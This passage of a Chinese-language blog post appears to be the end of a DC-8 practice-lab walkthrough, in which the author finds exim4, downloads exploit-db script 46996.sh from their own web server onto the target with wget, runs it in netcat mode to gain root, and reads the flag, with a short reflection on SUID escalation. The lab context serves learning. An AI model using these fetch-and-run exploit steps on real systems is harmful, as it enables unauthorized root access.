<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">不知道需要做什么，积累太少了，啥也不知道。看教程！</span><br><span class="line">发现 exim 4，这也就是一个队列的全局变量，可以用于邮件实现一些功能，是一个命令，是一个文件，那就看看这有没有漏洞</span><br><span class="line">&#x2F;usr&#x2F;sbin&#x2F;exim4 --version	&#x2F;&#x2F;查看版本</span><br><span class="line">searchsploit exim 4</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/15/LM3GYeFCP9DdZwx.png" alt="image-20211215230711101"></p>
<p><img src="https://s2.loli.net/2021/12/15/lfZJ7b28VxQwOXA.png" alt="image-20211215231129734"></p>
<p>一看,哦豁 rce，但是时local还是remote呢？不懂啊，看教程说是local。。。</p>
<p><img src="https://s2.loli.net/2021/12/15/TMwBy2rcet7IiDW.png" alt="image-20211215231456758"></p>
<p>去看看这个利用先</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;Linux&#x2F;local&#x2F;</span><br><span class="line">cat 46996.sh</span><br><span class="line">发现这个有很多种使用方法，但我的目的时连上root的shell，直接找我会的，netcat！</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/15/6odc3saKDWFpmRl.png" alt="image-20211215231901793"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">其实看了也还是不懂怎么用，.sh的文件，bash的解释器</span><br><span class="line">看了看，发现看错地方，要看usage你妈妈！</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/15/3AGJu9kYvhy6zwp.png" alt="image-20211215232152119"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;46996.sh xxxxxxx</span><br><span class="line">那我的脚本是本地的，只能wget过去</span><br><span class="line">cp到我本地虚拟机的apache2目录下：&#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;46996.sh 46996.sh</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/15/8hQn1Usy7bemIxY.png" alt="image-20211215232431372"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">开启本地网络服务：</span><br><span class="line">service apache2 start</span><br><span class="line">service apache2 statue	&#x2F;&#x2F;查看状态</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在靶机shell中，tmp目录中，这个目录由于每次关机都会清除数据，权限高，wget到其他的文件夹都会显示denied</span><br><span class="line">cd &#x2F;tmp</span><br><span class="line">wget http:&#x2F;&#x2F;192.168.136.128&#x2F;46996.sh</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/15/XtZ8uTQEKcaRlJ1.png" alt="image-20211215232820567"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">开始利用</span><br><span class="line">chmod 777 46996.sh</span><br><span class="line">.&#x2F;46996.sh -m netcat 	&#x2F;&#x2F;为啥不用写端口捏？因为是local，里面指定127.0.0.1 31337了</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/15/aH2SZBpchMwuQxy.png" alt="image-20211215233134598"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">很好，很好，root来了</span><br><span class="line">加个交互式shell，加不上，g</span><br><span class="line">ls	&#x2F;&#x2F;没有flag</span><br><span class="line">cd &#x2F;home 	&#x2F;&#x2F;没有flag</span><br><span class="line">cd root 	&#x2F;&#x2F;当初能打出这个我也是牛逼</span><br><span class="line">cd &#x2F;root</span><br><span class="line">ls	&#x2F;&#x2F;flag.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/15/Xk7SRrzC51x8TtO.png" alt="image-20211215234302946"></p>
<p>结束</p>
<p>思考？</p>
<p>要是不开这个邮件文件服务exim 4，那不是就g了？但是转念一想，我们的getshell机会就是遇到这种不经意的权限下放，suid文件的提权。那么如何防护suid提权？那就是将文件权限死死拿住，不给除了属主外的用户更改任何权限！</p>
<p>学到了啥？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">学到了suid权限以及提权</span><br><span class="line">sqlmap的入门使用</span><br><span class="line">复习了john暴力解码</span><br><span class="line">再次了解文件权限格式</span><br><span class="line">了解nc的用途</span><br><span class="line">回顾信息搜集流程</span><br></pre></td></tr></table></figure>
<ul>
<li>DC完结！</li>
</ul>

                
                <hr>
                <!-- Pager -->
                <ul class="pager">
                    
                    <li class="previous">
                        <a href="/2022/02/14/Friends-Mei/" data-toggle="tooltip" data-placement="top" title="朋友和我">&larr; Previous Post</a>
                    </li>
                    
                    
                    <li class="next">
                        <a href="/2022/01/19/2021HW总结笔记/" data-toggle="tooltip" data-placement="top" title="2021HW总结">Next Post &rarr;</a>
                    </li>
                    
                </ul>

                <!-- tip start -->
                

                
                <div class="comment_notes">
                    <p>
                        本博客所有文章除特别声明外，均采用 CC BY-SA 4.0 协议 ，转载请注明出处！
                    </p>
                </div>
                
                <!-- tip end -->

                <!-- Music start-->
                
                
<link rel="stylesheet" href="/css/music-player/fonts/iconfont.css">


<link rel="stylesheet" href="/css/music-player/css/reset.css">


<link rel="stylesheet" href="/css/music-player/css/player.css">


<div class="music-player">
    <audio class="music-player__audio" ></audio>
    <div class="music-player__main">
        <div class="music-player__blur"></div>
        <div class="music-player__disc">
            <div class="music-player__image">
                <img width="100%" src="" alt="">
            </div>
            <div class="music-player__pointer"><img width="100%" src="/img/cd_tou.png" alt=""></div>
        </div>
        <div class="music-player__controls">
            <div class="music__info">
                <h3 class="music__info--title">...</h3>
                <p class="music__info--singer">...</p>
            </div>
            <div class="player-control">
                <div class="player-control__content">
                    <div class="player-control__btns">
                        <div class="player-control__btn player-control__btn--prev"><i class="iconfont icon-prev"></i></div>
                        <div class="player-control__btn player-control__btn--play"><i class="iconfont icon-play"></i></div>
                        <div class="player-control__btn player-control__btn--next"><i class="iconfont icon-next"></i></div>
                        <div class="player-control__btn player-control__btn--mode"><i class="iconfont icon-loop"></i></div>
                    </div>
                    <div class="player-control__volume">
                        <div class="control__volume--icon player-control__btn"><i class="iconfont icon-volume"></i></div>
                        <div class="control__volume--progress player_progress"></div>
                    </div>
                </div>
                <div class="player-control__content">
                    <div class="player__song--progress player_progress"></div>
                    <div class="player__song--timeProgess nowTime">00:00</div>
                    <div class="player__song--timeProgess totalTime">00:00</div>
                </div>
            </div>
        </div>
    </div>
</div>


<script src="/js/music-player/utill.js"></script>


<script src="/js/music-player/jquery.min.js"></script>

<!-- netease; qqkg -->
<!--
<script src="/js/music-player/player.js?library=config.music.library.js"></script>
-->
<script src="../../../../js/music-player/player.js?library=netease&music=https://kg.qq.com/node/play?s=7deFpz7Z26Jmv7di&g_f=share_html"></script>
                
                <!-- Music end -->

                <!-- Sharing -->
                
                <div class="social-share"  data-wechat-qrcode-helper="" align="center"></div>
                <!--  css & js -->
                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
                <script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
                
                <!-- Sharing -->

                <!-- gitment start -->
                
                <!-- gitment end -->

                <!-- 来必力City版安装代码 -->
                
                <!-- City版安装代码已完成 -->

                <!-- disqus comment start -->
                
                <!-- disqus comment end -->
            </div>
            
            <!-- Tabe of Content -->
            <!-- Table of Contents -->

    
      
        <aside id="sidebar">
          <div id="toc" class="toc-article">
          <strong class="toc-title">Contents</strong>
          
            
              <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#DC-1"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">DC-1</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#前置知识"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">前置知识</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#打开靶场"><span class="toc-nav-number">1.1.1.</span> <span class="toc-nav-text">打开靶场</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#linux必备命令"><span class="toc-nav-number">1.1.2.</span> <span class="toc-nav-text">linux必备命令</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#shell"><span class="toc-nav-number">1.1.3.</span> <span class="toc-nav-text">shell</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#apt"><span class="toc-nav-number">1.1.4.</span> <span class="toc-nav-text">apt</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#PHP-Meterpreter后门"><span class="toc-nav-number">1.1.5.</span> <span class="toc-nav-text">PHP Meterpreter后门</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#SUID-find提权"><span class="toc-nav-number">1.1.6.</span> <span class="toc-nav-text">SUID- find提权</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#探测内网存活主机"><span class="toc-nav-number">1.1.7.</span> <span class="toc-nav-text">探测内网存活主机</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#DC-1-实操"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">DC-1 实操</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#DC-2"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">DC-2</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#前置知识-1"><span class="toc-nav-number">2.1.</span> <span class="toc-nav-text">前置知识</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#cewl使用（概括）"><span class="toc-nav-number">2.1.1.</span> <span class="toc-nav-text">cewl使用（概括）</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#dirb扫目录（kali）"><span class="toc-nav-number">2.1.2.</span> <span class="toc-nav-text">dirb扫目录（kali）</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#wpscan（可结合Metasploit‘msf’利用插件中的漏洞）"><span class="toc-nav-number">2.1.3.</span> <span class="toc-nav-text">wpscan（可结合Metasploit‘msf’利用插件中的漏洞）</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#WordPress网站内容管理系统"><span class="toc-nav-number">2.1.4.</span> <span class="toc-nav-text">WordPress网站内容管理系统</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#rebash绕过："><span class="toc-nav-number">2.1.5.</span> <span class="toc-nav-text">rebash绕过：</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#sudo提权"><span class="toc-nav-number">2.1.6.</span> <span class="toc-nav-text">sudo提权</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#DC-2-实操"><span class="toc-nav-number">2.2.</span> <span class="toc-nav-text">DC-2 实操</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#DC-3"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">DC-3</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#前置知识-2"><span class="toc-nav-number">3.1.</span> <span class="toc-nav-text">前置知识</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#nmap脚本script的使用"><span class="toc-nav-number">3.1.1.</span> <span class="toc-nav-text">nmap脚本script的使用</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Joomia的CMS扫描"><span class="toc-nav-number">3.1.2.</span> <span class="toc-nav-text">Joomia的CMS扫描</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#查看kali的漏洞库"><span class="toc-nav-number">3.1.3.</span> <span class="toc-nav-text">查看kali的漏洞库</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#john破解散列哈希"><span class="toc-nav-number">3.1.4.</span> <span class="toc-nav-text">john破解散列哈希</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#反弹shell（初次接触，打好基础）"><span class="toc-nav-number">3.1.5.</span> <span class="toc-nav-text">反弹shell（初次接触，打好基础）</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#一句话木马"><span class="toc-nav-number">3.1.6.</span> <span class="toc-nav-text">一句话木马</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#哥斯拉使用"><span class="toc-nav-number">3.1.7.</span> <span class="toc-nav-text">哥斯拉使用</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#DC-3实操"><span class="toc-nav-number">3.2.</span> <span class="toc-nav-text">DC-3实操</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#DC-4"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">DC-4</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#前置知识-3"><span class="toc-nav-number">4.1.</span> <span class="toc-nav-text">前置知识</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#kali中bp的使用"><span class="toc-nav-number">4.1.1.</span> <span class="toc-nav-text">kali中bp的使用</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#熟悉kali自带的任何板块"><span class="toc-nav-number">4.1.2.</span> <span class="toc-nav-text">熟悉kali自带的任何板块</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#一些拿到交互端口后的信息收集"><span class="toc-nav-number">4.1.3.</span> <span class="toc-nav-text">一些拿到交互端口后的信息收集</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#linux中的ect文件目录"><span class="toc-nav-number">4.1.4.</span> <span class="toc-nav-text">linux中的ect文件目录</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#linux中的var文件目录"><span class="toc-nav-number">4.1.5.</span> <span class="toc-nav-text">linux中的var文件目录</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Mydra九头蛇多协议爆破"><span class="toc-nav-number">4.1.6.</span> <span class="toc-nav-text">Mydra九头蛇多协议爆破</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#echo等写入命令"><span class="toc-nav-number">4.1.7.</span> <span class="toc-nav-text">echo等写入命令</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#DC-4实操"><span class="toc-nav-number">4.2.</span> <span class="toc-nav-text">DC-4实操</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#DC-5"><span class="toc-nav-number">5.</span> <span class="toc-nav-text">DC-5</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#前置知识-4"><span class="toc-nav-number">5.1.</span> <span class="toc-nav-text">前置知识</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#网站目录爆破"><span class="toc-nav-number">5.1.1.</span> <span class="toc-nav-text">网站目录爆破</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#文件包含漏洞"><span class="toc-nav-number">5.1.2.</span> <span class="toc-nav-text">文件包含漏洞</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#中间件是什么？"><span class="toc-nav-number">5.1.2.1.</span> <span class="toc-nav-text">中间件是什么？</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#DC-5实操"><span class="toc-nav-number">5.2.</span> <span class="toc-nav-text">DC-5实操</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#DC-6"><span class="toc-nav-number">6.</span> <span class="toc-nav-text">DC-6</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#前置知识-5"><span class="toc-nav-number">6.1.</span> <span class="toc-nav-text">前置知识</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#linux根目录"><span class="toc-nav-number">6.1.1.</span> <span class="toc-nav-text">linux根目录</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#sudo命令"><span class="toc-nav-number">6.1.2.</span> <span class="toc-nav-text">sudo命令</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#nmap常用命令"><span class="toc-nav-number">6.1.3.</span> <span class="toc-nav-text">nmap常用命令</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Wpscan："><span class="toc-nav-number">6.1.4.</span> <span class="toc-nav-text">Wpscan：</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#linux下的提权"><span class="toc-nav-number">6.1.5.</span> <span class="toc-nav-text">linux下的提权</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#系统内核"><span class="toc-nav-number">6.1.5.1.</span> <span class="toc-nav-text">系统内核</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#shell是啥？"><span class="toc-nav-number">6.1.5.2.</span> <span class="toc-nav-text">shell是啥？</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#bash是啥？"><span class="toc-nav-number">6.1.5.3.</span> <span class="toc-nav-text">bash是啥？</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#DC-6实操"><span class="toc-nav-number">6.2.</span> <span class="toc-nav-text">DC-6实操</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#DC-7"><span class="toc-nav-number">7.</span> <span class="toc-nav-text">DC-7</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#前置知识-6"><span class="toc-nav-number">7.1.</span> <span class="toc-nav-text">前置知识</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#DC-7实操"><span class="toc-nav-number">7.2.</span> <span class="toc-nav-text">DC-7实操</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#DC-8"><span class="toc-nav-number">8.</span> <span class="toc-nav-text">DC-8</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#前置知识-7"><span class="toc-nav-number">8.1.</span> <span class="toc-nav-text">前置知识</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#sqlmap使用"><span class="toc-nav-number">8.1.1.</span> <span class="toc-nav-text">sqlmap使用</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#john解密"><span class="toc-nav-number">8.1.2.</span> <span class="toc-nav-text">john解密</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#信息收集的流程"><span class="toc-nav-number">8.1.3.</span> <span class="toc-nav-text">信息收集的流程</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#nc小小军刀"><span class="toc-nav-number">8.1.4.</span> <span class="toc-nav-text">nc小小军刀</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#suid提权"><span class="toc-nav-number">8.1.5.</span> <span class="toc-nav-text">suid提权</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#文件权限基础"><span class="toc-nav-number">8.1.6.</span> <span class="toc-nav-text">文件权限基础</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#SUID和SGID："><span class="toc-nav-number">8.1.6.1.</span> <span class="toc-nav-text">SUID和SGID：</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-6"><a class="toc-nav-link" href="#suid提权-1"><span class="toc-nav-number">8.1.6.1.1.</span> <span class="toc-nav-text">suid提权</span></a></li><li class="toc-nav-item toc-nav-level-6"><a class="toc-nav-link" href="#如何提权？"><span class="toc-nav-number">8.1.6.1.2.</span> <span class="toc-nav-text">如何提权？</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#DC-8实操"><span class="toc-nav-number">8.1.7.</span> <span class="toc-nav-text">DC-8实操</span></a></li></ol></li></ol></li></ol>
            
          
          </div>
        </aside>
      
    

                
            <!-- Sidebar Container -->
            <div class="
                col-lg-8 col-lg-offset-2
                col-md-10 col-md-offset-1
                sidebar-container">

                <!-- Featured Tags -->
                
                <section>
                    <!-- no hr -->
                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
                    <div class="tags">
                       
                          <a class="tag" href="/tags/#DC靶场" title="DC靶场">DC靶场</a>
                        
                    </div>
                </section>
                

                <!-- Friends Blog -->
                
                <hr>
                <h5>FRIENDS</h5>
                <ul class="list-inline">

                    
                        <li><a href="http://na0h.cn/" target="_blank">间隔</a></li>
                    
                        <li><a href="https://hututu-w.github.io/" target="_blank">冰洁</a></li>
                    
                        <li><a href="https://gutoom.github.io/" target="_blank">Master_Zhang</a></li>
                    
                        <li><a href="https://saltyfishyjk.github.io/" target="_blank">saltyfishyjk</a></li>
                    
                        <li><a href="http://lyxx.link/" target="_blank">林会安全</a></li>
                    
                </ul>
                
            </div>
        </div>
    </div>
</article>




<!-- async load function -->
<script>
    function async(u, c) {
      var d = document, t = 'script',
          o = d.createElement(t),
          s = d.getElementsByTagName(t)[0];
      o.src = u;
      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
      s.parentNode.insertBefore(o, s);
    }
</script>
<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
<script>
    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
        anchors.options = {
          visible: 'hover',
          placement: 'left',
          icon: 'ℬ'
        };
        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
    })
</script>


<style  type="text/css">
    /* place left on bigger screen */
    @media all and (min-width: 800px) {
        .anchorjs-link{
            position: absolute;
            left: -0.75em;
            font-size: 1.1em;
            margin-top : -0.1em;
        }
    }
</style>



    <!-- Footer -->
    <!-- Footer -->
<footer>
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <ul class="list-inline text-center">

                
                    <li>
                        <a target="_blank"  href="https://github.com/wxx0105">
                            <span class="fa-stack fa-lg">
                                <i class="fa fa-circle fa-stack-2x"></i>
                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                            </span>
                        </a>
                    </li>
                

                

                

                

                

                

                

                </ul>
                <p class="copyright text-muted">
                    Copyright &copy; wx_x 2022 
                    <br>
                    Powered by 
                    <a href="https://github.com/dusign/hexo-theme-snail">
                        <i>hexo-theme-snail</i>
                    </a> | 
                    <iframe name="star" style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0"
                        width="100px" height="20px"
                        src="https://ghbtns.com/github-btn.html?user=dusign&repo=hexo-theme-snail&type=star&count=true">
                    </iframe>
                </p>
            </div>
        </div>
    </div>

</footer>

<!-- jQuery -->

<script src="/js/jquery.min.js"></script>


<!-- Bootstrap Core JavaScript -->

<script src="/js/bootstrap.min.js"></script>


<!-- Custom Theme JavaScript -->

<script src="/js/hux-blog.min.js"></script>


<!-- Search -->

<script src="/js/search.js"></script>


<!-- async load function -->
<script>
    function async(u, c) {
      var d = document, t = 'script',
          o = d.createElement(t),
          s = d.getElementsByTagName(t)[0];
      o.src = u;
      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
      s.parentNode.insertBefore(o, s);
    }
</script>


<!-- jquery.tagcloud.js -->
<script>
    // only load tagcloud.js in tag.html
    if($('#tag_cloud').length !== 0){
        async("https://github.com/wxx0105/wxx0105.github.io/js/jquery.tagcloud.js",function(){
            $.fn.tagcloud.defaults = {
                //size: {start: 1, end: 1, unit: 'em'},
                color: {start: '#bbbbee', end: '#0085a1'},
            };
            $('#tag_cloud a').tagcloud();
        })
    }
</script>

<!--fastClick.js -->
<script>
    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
        var $nav = document.querySelector("nav");
        if($nav) FastClick.attach($nav);
    })
</script>


<!-- Google Analytics -->


<script>
    // dynamic User by Hux
    var _gaId = 'UA-XXXXXXXX-X';
    var _gaDomain = 'yoursite';

    // Originial
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

    ga('create', _gaId, _gaDomain);
    ga('send', 'pageview');
</script>




<!-- Baidu Tongji -->


<!-- Search -->

    <script type="text/javascript">      
        var search_path = "search.xml";
        if (search_path.length == 0) {
            search_path = "search.xml";
        }
    var path = "/" + search_path;
    searchFunc(path, 'local-search-input', 'local-search-result');
    </script>


<!-- busuanzi -->
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>






	<a id="rocket" href="#top" class=""></a>
	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
    <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>

    
        <!-- background effects line -->
        

        
            <script type="text/javascript" src="/js/mouse-click.js" content='[&quot;🌱&quot;,&quot;just do it wxx&quot;,&quot;🍀&quot;,&quot;🍂&quot;,&quot;🌈&quot;,&quot;🧿&quot;,&quot;🍁&quot;,&quot;🍇&quot;,&quot;🍍&quot;,&quot;🕌&quot;,&quot;⛩️&quot;]' color='[&quot;rgb(121,93,179)&quot; ,&quot;rgb(76,180,231)&quot; ,&quot;rgb(184,90,154)&quot;]'></script>
        

        <!-- background effects end -->
    

    <!--<script size="50" alpha='0.3' zIndex="-999" src="/js/ribbonStatic.js"></script>-->
    
        <script src="/js/ribbonDynamic.js"></script>
    
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
</body>

</html>
